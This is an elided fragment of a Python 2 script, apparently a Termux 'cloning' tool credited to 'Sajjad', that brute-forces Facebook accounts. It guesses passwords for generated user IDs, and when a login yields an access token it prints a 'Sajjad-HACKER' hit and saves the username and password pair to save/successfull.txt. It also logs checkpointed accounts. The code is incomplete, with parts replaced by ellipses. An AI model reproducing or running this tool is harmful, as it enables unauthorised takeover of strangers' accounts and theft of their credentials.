...
print("\033[0;91mThis Tool's Free By Sajjad Islam")

psb('\x1b[1;92mBANGLADESH SAJJAD 6 DIGIT CLONING START PLEASE WAIT .....')
...
def menu():
    ...
    print logo
    print ''
    print '\033[0;93mAUTHOR   : Shahzada Ahmed Sajjad 
    print '\033[0;94mFACEBOOK : Termux Lover Sajjad
    print '\033[0;96mGITHUB   : Termux Sajjad
    print ''
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                print '\x1b[1;92m[Sajjad-HACKER]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\n' + '\n'
                okb = open('save/successfull.txt', 'a')
                okb.write(k + c + user + '|' + pass1 + '\n')
                okb.close()
                oks.append(c + user + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;91m[Sajjad-CP]\x1b[0m ' + k + c + user + ' | ' + pass1 + '\x1b[1;92m \x1b[0m \n'
